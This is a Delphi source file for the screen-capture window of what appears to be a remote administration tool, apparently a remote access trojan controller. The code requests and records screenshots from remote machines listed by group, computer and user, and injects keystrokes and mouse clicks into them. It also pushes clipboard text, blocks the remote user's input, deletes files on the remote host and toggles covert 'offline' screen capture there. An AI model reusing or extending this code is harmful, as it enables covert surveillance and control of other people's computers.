unit UnitScreenCapture;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP, IniFiles,
  ComCtrls, ImgList, ToolWin, Menus, ClipBrd, UnitSharedData, STrUtils,
  ExtDlgs, UnitAvi;

type
  TScreenCapture = class(TForm)
    ProgressBar1: TProgressBar;
    Timer1: TTimer;
    StatusBar1: TStatusBar;
    ImageList1: TImageList;
    PopupMenu2: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem2: TMenuItem;
    MenuItem4: TMenuItem;
    PopupMenu1: TPopupMenu;
    IncludeCursor2: TMenuItem;
    N5: TMenuItem;
    Quality2: TMenuItem;
    N12: TMenuItem;
    N82: TMenuItem;
    N162: TMenuItem;
    N242: TMenuItem;
    N322: TMenuItem;
    Inputs2: TMenuItem;
    KeyPress2: TMenuItem;
    N6: TMenuItem;
    MouseClick1: TMenuItem;
    MouseMoves1: TMenuItem;
    N7: TMenuItem;
    Clipboard2: TMenuItem;
    Stretch2: TMenuItem;
    N8: TMenuItem;
    N9: TMenuItem;
    SaveImages2: TMenuItem;
    PopupMenu3: TPopupMenu;
    MenuItem8: TMenuItem;
    DeleteFolder1: TMenuItem;
    RemoveWallpaper1: TMenuItem;
    Panel1: TPanel;
    ScrollBox1: TScrollBox;
    Image1: TImage;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ToolButton3: TToolButton;
    ToolButton4: TToolButton;
    Panel2: TPanel;
    Splitter1: TSplitter;
    TreeView1: TTreeView;
    ScrollBox2: TScrollBox;
    Image2: TImage;
    Timer2: TTimer;
    Timer3: TTimer;
    DisableMouseKeyboard1: TMenuItem;
    Delay1: TMenuItem;
    NoDelay1: TMenuItem;
    N1Second1: TMenuItem;
    N2Second1: TMenuItem;
    N5Seconds1: TMenuItem;
    N10Seconds1: TMenuItem;
    DelayTimer: TTimer;
    N41: TMenuItem;
    ToolButton2: TToolButton;
    SavePictureDialog1: TSavePictureDialog;
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Single1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure TreeView1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure TreeView1DblClick(Sender: TObject);
    procedure ToolButton1Click(Sender: TObject);
    procedure IncludeCursor2Click(Sender: TObject);
    procedure N12Click(Sender: TObject);
    procedure N82Click(Sender: TObject);
    procedure N162Click(Sender: TObject);
    procedure N242Click(Sender: TObject);
    procedure N322Click(Sender: TObject);
    procedure Stretch2Click(Sender: TObject);
    procedure SaveImages2Click(Sender: TObject);
    procedure Clipboard2Click(Sender: TObject);
    procedure MenuItem4Click(Sender: TObject);
    procedure MenuItem8Click(Sender: TObject);
    procedure DeleteFolder1Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure RemoveWallpaper1Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure KeyPress2Click(Sender: TObject);
    procedure MouseClick1Click(Sender: TObject);
    procedure MouseMoves1Click(Sender: TObject);
    procedure DisableMouseKeyboard1Click(Sender: TObject);
    procedure N1Second1Click(Sender: TObject);
    procedure NoDelay1Click(Sender: TObject);
    procedure N2Second1Click(Sender: TObject);
    procedure N5Seconds1Click(Sender: TObject);
    procedure N10Seconds1Click(Sender: TObject);
    procedure DelayTimerTimer(Sender: TObject);
    procedure N41Click(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
  private
    { Private declarations }
    lastnode: ttreenode;
    fps: integer;
    AviStringList: TStringList;
  public
    { Public declarations }
    Offline: bool;
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    ScreenData: string;
    BitCount: integer;
    snum: integer;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
    procedure AddAllFolders(Folders: string);
  end;

var
  ScreenCapture: TScreenCapture;
  OldClipboard: string;
  LastClick: dword;

implementation

uses UnitSettings,UnitConnectionForm, UnitSaveProgress;


{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'ScreenCapture|' + Data);
end;

procedure SendDataOffline(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'OfflineScreenCapture|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TScreenCapture(SocketData.Form).NewSocket = nil then exit;
  TScreenCapture(SocketData.Form).NewSocket := nil;
  TScreenCapture(SocketData.Form).Caption := TScreenCapture(SocketData.Form).Caption + ' - [Offline]';
  TScreenCapture(SocketData.Form).Timer3.Enabled := True;

end;

procedure ReceiveDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  TScreenCapture(SocketData.Form).ProgressBar1.Max := Max;
  TScreenCapture(SocketData.Form).ProgressBar1.Position := Progress;
end;

procedure TScreenCapture.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.ReceiveDataProc := @ReceiveDataProc;
  Timer3.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  if (Treeview1.Items.Count = 1) and (Offline = True) then begin
    SendDataOffline(Socket,'Images');
  end;
  if Offline = False then begin
    if Settings.CheckBox3.Checked then RemoveWallpaper1.Click;
  end;
  if Settings.CheckBox14.Checked then ToolButton1.Down := True;
  if ToolButton1.Down then ToolButton1.Click;
end;

function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  if Length(s1) <> length(s2) then exit;
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s2[i] = '%' then begin
      Result[i] := s1[i];
    end else begin
      Result[i] := s2[i];
    end;
  end;
end;

function GetDate: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wDay) + '-' + inttostr(MyTime.wMonth) + '-' + inttostr(MyTime.wYear);
end;

function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + '.' + inttostr(MyTime.wMinute) + '.' + inttostr(MyTime.wSecond) + '.' + inttostr(MyTime.wMilliseconds);
end;

function FindNode(Caption: string; Treeview: TTreeview; node: TTreenode): TTreeNode;
var
  i: integer;
begin
  result := nil;
  if Node = nil then begin
    for i := 0 to treeview.Items.Count -1 do begin
      if uppercase(treeview.Items[i].Text) = uppercase(caption) then result := treeview.Items[i];
      //BREAK;
    end;
  end else begin
    for i := 0 to node.Count -1 do begin
      if uppercase(node.Item[i].Text) = uppercase(caption) then result := node.Item[i];
      //BREAK;
    end;
  end;
end;

procedure TScreenCapture.AddAllFolders(Folders: string);
var
  tmp: string;
  node: ttreenode;
begin
  lastnode := nil;
  while length(Folders) > 0 do begin
    tmp := Split(Folders,'\',1);
    delete(Folders,1,length(tmp)+1);
    if length(tmp) = 2 then tmp := tmp + '\';
    node := FindNode(tmp,Treeview1,LastNode);
    if node = nil then begin
      Node := Treeview1.Items.AddChild(LastNode,tmp);
      Node.ImageIndex := 4;
      Node.SelectedIndex := 4;
      //Node.Expand(False);
    end else begin
      //Node := Treeview1.Items.AddChild(Node,Tmp);
      //Node.Expand(False);
    end;
    if node.Parent <> nil then node.Parent.Expand(false);
    lastnode := node;
    //lastnode.Expand(false);
  end;
end;

function Ca(St: string): string;
var
  i: integer;
  a: byte;
begin
  for i := length(St) downto 1 do begin
    A := ord(St[i]);
    result := result + char(a-1);
  end;
end;

procedure TScreenCapture.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  d,path: string;
  node: ttreenode;
  i: integer;
  Logs: tstringlist;
  Name: string;
  Stream: TMemorystream;
  Bmp: TBitmap;
  Bmp2: TBitmap;
  p: tpicture;
  n: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);


  if Command = 'ScreenShot' then begin
    inc(fps);
    Data := SFUnpackStr(Data);
    if ScreenData = '' then SetLength(ScreenData,Length(Data));
    d := CompareString(ScreenData,Data,Length(Data));
    screendata := d;
    stream := tmemorystream.Create;
    stream.WriteBuffer(pointer(d)^,length(d));
    stream.Position := 0;


    try
      //Image1.Picture.LoadFromFile('c:\server.bmp');
      Image1.Picture.Bitmap.LoadFromStream(Stream);
    except
      screendata := '';
      SendData(Socket,'ClearData');
    end;

    if SaveImages2.Checked then begin
      try
        n := SocketData.ScreenPath + GetDate + '\' + GetTime + '.bmp';
        image1.Picture.SaveToFile(n);
        AviStringList.Add(n);
      except
      end;
    end;

    stream.Free;
    Application.ProcessMessages;
    if ToolButton1.Down then begin
      if NoDelay1.Checked then begin
        ToolButton1.Click;
      end else begin
        DelayTimer.Enabled := True;
      end;
    end;
  end;

  if Command = 'Images' then begin
    Treeview1.Items.BeginUpdate;
    Logs := TStringList.Create;
    Logs.Text := Data;
    for i := 0 to Logs.Count -1 do begin
      Name := ExtractFileName(Logs[i]);
      Path := ExtractFileDir(Logs[i]);
      Path := ReverseString(Path);
      Path := Split(Path,'\',1) + '\' + Split(Path,'\',2);
      Path := ReverseString(Path);
      AddAllFolders('Images\' + Path);
      Node := Treeview1.Items.AddChild(LastNode,Name);
      Node.ImageIndex := 3;
      Node.SelectedIndex := 3;
      //Lastnode.Expand(True);
    end;
    Statusbar1.SimpleText := inttostr(Logs.Count) + ' Images';
    Logs.Free;
    Treeview1.Items.EndUpdate;
  end;

  if Command = 'GetImage' then begin
    Data := Ca(Data);
    stream := tmemorystream.Create;
    stream.WriteBuffer(pointer(Data)^,length(Data));
    stream.Position := 0;
    try
      Image2.Picture.Bitmap.LoadFromStream(Stream);
    except
      ShowMessage('Error Displaying Image');
    end;
    stream.Free;
  end;


end;

procedure TScreenCapture.Image1MouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
var
  Point: TPoint;
begin
  if not MouseMoves1.Checked then exit;
  Point.X := X * Image1.Picture.Bitmap.Width div Image1.Width;
  Point.Y := Y * Image1.Picture.Bitmap.Height div Image1.Height;
  SendData(NewSocket,'MousePos|' + inttostr(Point.X) + '|' + inttostr(Point.Y ));
end;

procedure TScreenCapture.FormKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if not KeyPress2.Checked then exit;
  SendData(NewSocket,'KeyUp|' + inttostr(Key));
end;

procedure TScreenCapture.FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
begin
  if not KeyPress2.Checked then exit;
  SendData(NewSocket,'KeyDown|' + inttostr(Key));
end;

procedure TScreenCapture.Image1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var
  Point: TPoint;
begin
  {if not MouseClick1.Checked then exit;
  Point.X := X * Image1.Picture.Bitmap.Width div Image1.Width;
  Point.Y := Y * Image1.Picture.Bitmap.Height div Image1.Height;
  SendData(NewSocket,'MousePos|' + inttostr(Point.X) + '|' + inttostr(Point.Y ));
  if Button = MbLeft then SendData(NewSocket,'LeftMouseDown');
  if Button = MbRight then SendData(NewSocket,'RightMouseDown');
  }
end;

procedure TScreenCapture.Image1MouseUp(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var
  Point: TPoint;
begin
  if not MouseClick1.Checked then exit;

  Point.X := X * Image1.Picture.Bitmap.Width div Image1.Width;
  Point.Y := Y * Image1.Picture.Bitmap.Height div Image1.Height;


  {SendData(NewSocket,'MousePos|' + inttostr(Point.X) + '|' + inttostr(Point.Y ));
  if Button = MbLeft then SendData(NewSocket,'LeftMouseUp');
  if Button = MbRight then SendData(NewSocket,'RightMouseUp');}

  if GetTickCount - LastClick < 250 then begin
    if Button = MbLeft then SendData(NewSocket,'LeftMouseDoubleClick|' + inttostr(Point.X) + '|' + inttostr(Point.Y));
    if Button = MbRight then SendData(NewSocket,'RightMouseDoubleClick|' + inttostr(Point.X) + '|' + inttostr(Point.Y));
  end else begin
    if Button = MbLeft then SendData(NewSocket,'LeftMouseClick|' + inttostr(Point.X) + '|' + inttostr(Point.Y));
    if Button = MbRight then SendData(NewSocket,'RightMouseClick|' + inttostr(Point.X) + '|' + inttostr(Point.Y));
  end;
  LastClick := GetTickCount

end;


procedure TScreenCapture.FormCreate(Sender: TObject);
var
  Ini: TIniFile;
begin
  BitCount := 8;
  sNum := 0;
  LastClick := 0;

  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    IncludeCursor2.Checked := Ini.ReadBool('ScreenCapture','IncludeCursor',IncludeCursor2.Checked);

    BitCount := Ini.ReadInteger('ScreenCapture','Quality',BitCount);
    if BitCount = 1 then n12.Click;
    if BitCount = 4 then n41.Click;
    if BitCount = 8 then n82.Click;
    if BitCount = 16 then n162.Click;
    if BitCount = 24 then n242.Click;
    if BitCount = 32 then n322.Click;

    KeyPress2.Checked := Ini.ReadBool('ScreenCapture','KeyPress',KeyPress2.Checked);
    MouseClick1.Checked := Ini.ReadBool('ScreenCapture','MouseClick',MouseClick1.Checked);
    MouseMoves1.Checked := Ini.ReadBool('ScreenCapture','MouseMoves',MouseMoves1.Checked);
    Clipboard2.Checked := Ini.ReadBool('ScreenCapture','Clipboard',Clipboard2.Checked);

    DelayTimer.Interval := Ini.ReadInteger('ScreenCapture','Delay',DelayTimer.Interval);
    if DelayTimer.Interval = 1 then NoDelay1.Click;
    if DelayTimer.Interval = 1000 then N1Second1.Click;
    if DelayTimer.Interval = 2000 then N2Second1.Click;
    if DelayTimer.Interval = 5000 then N5Seconds1.Click;
    if DelayTimer.Interval = 10000 then N10Seconds1.Click;

    if Ini.ReadBool('ScreenCapture','Stretch',False) then Stretch2.Click;

  Ini.Free;

end;

procedure TScreenCapture.Timer1Timer(Sender: TObject);
var
  ClipBoard: TClipBoard;
  s: string;
begin
  ClipBoard := TClipboard.Create;
  s := ClipBoard.AsText;
  if OldClipboard <> s then begin
    OldClipboard := s;
    SendData(NewSocket,'Clipboard|' + s);
  end;
  Clipboard.Free;
end;

procedure TScreenCapture.Single1Click(Sender: TObject);
begin
  SendData(NewSocket,'ClearData');
  SendData(NewSocket,'ScreenShot|' + inttostr(BitCount));
end;

procedure TScreenCapture.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
  ini: TIniFile;
begin
  Hide;

  if (ToolButton1.Down) and (SaveImages2.Checked) then begin
    ToolButton1.Down := False;
    ToolButton1Click(ToolButton1);
  end;

  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    Ini.WriteBool('ScreenCapture','IncludeCursor',IncludeCursor2.Checked);
    Ini.WriteInteger('ScreenCapture','Quality',BitCount);
    Ini.WriteBool('ScreenCapture','KeyPress',KeyPress2.Checked);
    Ini.WriteBool('ScreenCapture','MouseClick',MouseClick1.Checked);
    Ini.WriteBool('ScreenCapture','MouseMoves',MouseMoves1.Checked);
    Ini.WriteBool('ScreenCapture','Clipboard',Clipboard2.Checked);
    Ini.WriteInteger('ScreenCapture','Delay',DelayTimer.Interval);
    Ini.WriteBool('ScreenCapture','Stretch',Stretch2.Checked); 
  Ini.Free;

  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TScreenCapture.TreeView1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  tmpNode: TTreeNode;
begin
  tmpNode := (Sender as TTreeView).GetNodeAt(MousePos.X, MousePos.Y);
  if tmpNode <> nil then TTreeView(Sender).Selected := tmpNode;
end;

procedure TScreenCapture.TreeView1DblClick(Sender: TObject);
var
  path: string;
  Node: TTreeNode;
begin
  if not assigned(Treeview1.Selected) then exit;
  if Treeview1.Selected.ImageIndex <> 3 then exit;

  Node := Treeview1.Selected;
  while Node.Parent <> nil do begin
    Path := Node.Text + '\' + Path;
    Node := Node.Parent;
  end;
  Path := Copy(Path,1,Length(Path)-1);

  SendDataOffline(NewSocket,'GetImage|' + Path);
end;

procedure ProgressFunc(Pos,Max: dword);
begin
  SaveProgress.Show;
  SaveProgress.ProgressBar1.Position := Pos;
  SaveProgress.ProgressBar1.Max := Max;
  SaveProgress.Label1.Caption := 'Saving Frame ' + inttostr(Pos) + ' / ' + inttostr(Max);
  if Pos = Max then SaveProgress.Close;
end;

procedure TScreenCapture.ToolButton1Click(Sender: TObject);
begin
  if Toolbutton1.Down then begin
    if AviStringList = nil then AviStringList := TStringList.Create;
    SendData(NewSocket,'ScreenShot|' + inttostr(BitCount) + '|' + inttostr(integer(IncludeCursor2.Checked)));
  end else begin
    if AviStringList.Count > 0 then UnitAvi.CreateAVI(@ProgressFunc,ChangeFileExt(AviStringList.Strings[0],'.avi'),AviStringList,2);
    AviStringList.Free;
    AviStringList := nil;
  end;
end;

procedure TScreenCapture.IncludeCursor2Click(Sender: TObject);
begin
  IncludeCursor2.Checked := not IncludeCursor2.Checked;
end;

procedure TScreenCapture.N12Click(Sender: TObject);
begin
  BitCount := 1;
  n12.Checked := True;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TScreenCapture.N82Click(Sender: TObject);
begin
  BitCount := 8;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := True;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TScreenCapture.N162Click(Sender: TObject);
begin
  BitCount := 16;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := True;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TScreenCapture.N242Click(Sender: TObject);
begin
  BitCount := 24;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := True;
  n322.Checked := False;
  screendata := '';
end;

procedure TScreenCapture.N322Click(Sender: TObject);
begin
  BitCount := 32;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := True;
  screendata := '';
end;

procedure TScreenCapture.Stretch2Click(Sender: TObject);
begin
  Stretch2.Checked := not Stretch2.Checked;
  if Stretch2.Checked then begin
    Image1.AutoSize := False;
    Image1.Align := alClient;
    Image1.Stretch := True;
  end else begin
    Image1.Stretch := False;
    Image1.Align := alNone;
    Image1.AutoSize := True;
  end;
end;

procedure TScreenCapture.SaveImages2Click(Sender: TObject);
begin
  SaveImages2.Checked := not SaveImages2.Checked;
  MakeSureDirectoryPathExists(pchar(SocketData.ScreenPath + GetDate + '\'));
end;

procedure TScreenCapture.Clipboard2Click(Sender: TObject);
begin
  Clipboard2.Checked := not Clipboard2.Checked;
  Timer1.Enabled := Clipboard2.Checked;
end;

procedure TScreenCapture.MenuItem4Click(Sender: TObject);
begin
  if not SavePictureDialog1.Execute then exit;
  Image2.Picture.SaveToFile(SavePictureDialog1.FileName);
end;

procedure TScreenCapture.MenuItem8Click(Sender: TObject);
var
  path: string;
  Node: TTreeNode;
begin
  if not assigned(Treeview1.Selected) then exit;

  Node := Treeview1.Selected;
  while Node.Parent <> nil do begin
    Path := Node.Text + '\' + Path;
    Node := Node.Parent;
  end;
  Path := Copy(Path,1,Length(Path)-1);

  SendDataOffline(NewSocket,'Delete|' + Path);
  Treeview1.Selected.Delete;

end;

procedure TScreenCapture.DeleteFolder1Click(Sender: TObject);
var
  path: string;
  Node: TTreeNode;
begin
  if not assigned(Treeview1.Selected) then exit;

  Node := Treeview1.Selected;
  while Node.Parent <> nil do begin
    Path := Node.Text + '\' + Path;
    Node := Node.Parent;
  end;
  Path := Copy(Path,1,Length(Path)-1);

  SendDataOffline(NewSocket,'Delete|' + Path);
  Treeview1.Selected.Delete;
end;
procedure TScreenCapture.MenuItem1Click(Sender: TObject);
begin
  MenuItem1.Checked := not MenuItem1.Checked;
  if MenuItem1.Checked then begin
    SendDataOffline(NewSocket,'Start');
    TSocketData(MainSocket.Data).ServerData.OfflineScreenCapture := 'True';
  end else begin
    SendDataOffline(NewSocket,'Stop');
    TSocketData(MainSocket.Data).ServerData.OfflineScreenCapture := 'False';
  end;
end;

procedure TScreenCapture.RemoveWallpaper1Click(Sender: TObject);
begin
  SendData(NewSocket,'RemoveDesktop');
end;

procedure TScreenCapture.Timer2Timer(Sender: TObject);
begin
  caption := inttostr(fps);
  fps := 0;
end;



procedure TScreenCapture.Timer3Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
  UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|ScreenCaptureSocket|' + inttostr(Self.Handle));
end;

procedure TScreenCapture.KeyPress2Click(Sender: TObject);
begin
  KeyPress2.Checked := not KeyPress2.Checked;
end;

procedure TScreenCapture.MouseClick1Click(Sender: TObject);
begin
  MouseClick1.Checked := not MouseClick1.Checked;
end;

procedure TScreenCapture.MouseMoves1Click(Sender: TObject);
begin
  MouseMoves1.Checked := not MouseMoves1.Checked;
end;

procedure TScreenCapture.DisableMouseKeyboard1Click(Sender: TObject);
begin
  DisableMouseKeyboard1.Checked := not DisableMouseKeyboard1.Checked;
  if DisableMouseKeyboard1.Checked then begin
    SendData(NewSocket,'BlockInput');
  end else begin
    SendData(NewSocket,'EnableInput');
  end;
end;

procedure TScreenCapture.N1Second1Click(Sender: TObject);
begin
  NoDelay1.Checked := False;
  n1Second1.Checked := True;
  N2Second1.Checked := False;
  N5Seconds1.Checked := False;
  N10Seconds1.Checked := False;
  DelayTimer.Interval := 1000;
end;

procedure TScreenCapture.NoDelay1Click(Sender: TObject);
begin
  NoDelay1.Checked := True;
  n1Second1.Checked := false;
  N2Second1.Checked := False;
  N5Seconds1.Checked := False;
  N10Seconds1.Checked := False;
  DelayTimer.Interval := 1;
end;

procedure TScreenCapture.N2Second1Click(Sender: TObject);
begin
  NoDelay1.Checked := False;
  n1Second1.Checked := false;
  N2Second1.Checked := True;
  N5Seconds1.Checked := False;
  N10Seconds1.Checked := False;
  DelayTimer.Interval := 2000;
end;

procedure TScreenCapture.N5Seconds1Click(Sender: TObject);
begin
  NoDelay1.Checked := False;
  n1Second1.Checked := false;
  N2Second1.Checked := False;
  N5Seconds1.Checked := True;
  N10Seconds1.Checked := False;
  DelayTimer.Interval := 5000;
end;

procedure TScreenCapture.N10Seconds1Click(Sender: TObject);
begin
  NoDelay1.Checked := False;
  n1Second1.Checked := false;
  N2Second1.Checked := False;
  N5Seconds1.Checked := False;
  N10Seconds1.Checked := True;
  DelayTimer.Interval := 10000;
end;

procedure TScreenCapture.DelayTimerTimer(Sender: TObject);
begin
  DelayTimer.Enabled := False;
  ToolButton1.Click;
end;

procedure TScreenCapture.N41Click(Sender: TObject);
begin
  BitCount := 4;
  n12.Checked := False;
  n41.Checked := True;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TScreenCapture.ToolButton2Click(Sender: TObject);
begin
  if not SavePictureDialog1.Execute then exit;
  Image1.Picture.SaveToFile(SavePictureDialog1.FileName);
end;

end.
